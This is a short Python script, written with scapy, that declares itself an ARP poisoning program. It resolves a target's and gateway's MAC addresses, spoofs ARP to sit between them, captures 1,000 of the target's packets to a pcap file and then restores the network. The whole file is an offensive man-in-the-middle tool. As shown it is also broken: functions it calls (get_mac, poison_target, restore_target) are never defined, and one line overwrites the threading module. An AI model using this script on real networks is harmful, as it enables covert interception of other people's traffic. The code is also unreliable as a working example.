#!/usr/bin/env python3

#This is an arp poisoning program

from scapy.all import *
import os
import sys
import threading
import signal

#My interface
interface = "enp56s0ulu4"
#target device IP
target_ip = "192.168.1.35"
#gateway machine
gateway_ip = "192.168.1.1"
packet_count = 1000

#set the interface
conf.iface = interface

#turn off output
conf.verb = 0

print("[*] Setting up %s" % interface)

#grab the gateway's mac accress from the mac
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting...")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting...")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (target_ip,target_mac))

#start poison thread
poison_thread = threading = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

    #Write the captured packets
    wrpcap('arper.pcap',packets)

    #restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    #Restort the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)

